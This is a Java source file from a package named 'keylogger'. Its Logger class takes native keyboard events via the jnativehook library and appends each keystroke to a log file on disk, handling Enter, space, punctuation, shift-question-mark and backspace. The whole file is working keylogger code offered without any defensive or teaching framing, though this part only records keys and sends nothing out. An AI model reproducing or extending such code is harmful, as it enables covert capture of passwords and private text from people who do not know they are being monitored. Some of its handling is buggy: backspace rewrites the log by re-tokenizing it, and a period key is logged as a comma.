package keylogger;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Scanner;

import org.jnativehook.keyboard.NativeKeyEvent;

public class Logger {
	private String path;
	private FileOutputStream out;

	private NativeKeyEvent previousKey, currentKey;

	public Logger(String path) {
		this.path = path;
	}

	private void closure() {
		try {
			out.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private boolean write(byte[] data, boolean append) {
		try {
			out = new FileOutputStream(path, append);
			out.write(data);

			return true;

		} catch (IOException e) {
			
			e.printStackTrace();

		} finally {
			closure();
		}

		return false;
	}

	public boolean log(NativeKeyEvent e) {

		currentKey = e;

		if (e.getKeyCode() == NativeKeyEvent.VK_CAPS_LOCK
				|| e.getKeyCode() == NativeKeyEvent.VK_ALT || e.getKeyCode() == NativeKeyEvent.VK_CONTROL
				|| e.getKeyCode() == NativeKeyEvent.VK_WINDOWS || e.getKeyCode() == NativeKeyEvent.VK_ESCAPE
				|| e.getKeyCode() == NativeKeyEvent.VK_DEAD_ACUTE) {
			previousKey = currentKey;
			return false;
		}

		else if (e.getKeyCode() == NativeKeyEvent.VK_ENTER) {
			previousKey = currentKey;
			return write("\n\r".getBytes(), true);
		} else if (e.getKeyCode() == NativeKeyEvent.VK_SPACE) {
			previousKey = currentKey;
			return write(" ".getBytes(), true);
		} else if (e.getKeyCode() == NativeKeyEvent.VK_BACK_SPACE) {
			try {
				previousKey = currentKey;
				return backspace(path);
			} catch (FileNotFoundException e1) {
				e1.printStackTrace();
				previousKey = currentKey;
				return false;
			}
		} else if (e.getKeyCode() == NativeKeyEvent.VK_QUOTE) {
			previousKey = currentKey;
			return write("'".getBytes(), true);
		} else if (e.getKeyCode() == NativeKeyEvent.VK_COMMA || e.getKeyCode() == NativeKeyEvent.VK_STOP) {
			previousKey = currentKey;
			return write(",".getBytes(), true);
		} else if (e.getKeyCode() == NativeKeyEvent.VK_PERIOD) {
			previousKey = currentKey;
			return write(".".getBytes(), true);
		} else if (e.getKeyCode() == NativeKeyEvent.VK_TAB)

		{
			previousKey = currentKey;
			return write("\t".getBytes(), true);
		}else if(previousKey != null && (previousKey.getKeyCode() == NativeKeyEvent.VK_SHIFT 
				&& currentKey.getKeyCode() == NativeKeyEvent.VK_SLASH
				||previousKey.getKeyCode() == NativeKeyEvent.VK_SHIFT 
				&& currentKey.getKeyCode() == NativeKeyEvent.VK_BACK_SLASH)) {
			
			previousKey = currentKey;
			return write("?".getBytes(), true);		
		}
		
		else {
			String currentKey = NativeKeyEvent.getKeyText(e.getKeyCode());
			if(currentKey.equalsIgnoreCase("shift")) {previousKey = this.currentKey;return true;}
			
			byte[] data = currentKey.getBytes();
			return write(data, true);
		}
	}

	private boolean backspace(String path) throws FileNotFoundException {
		Scanner scanner = new Scanner(new File(path));
		StringBuilder builder = new StringBuilder();
		while (scanner.hasNext()) {
			builder.append(scanner.next());
			builder.append(" ");
		}

		String data = builder.toString();
		if (data.length() > 1)
			data = data.substring(0, data.length() - 1);
		else
			data = "";

		scanner.close();
		return write(data.getBytes(), false);

	}
}
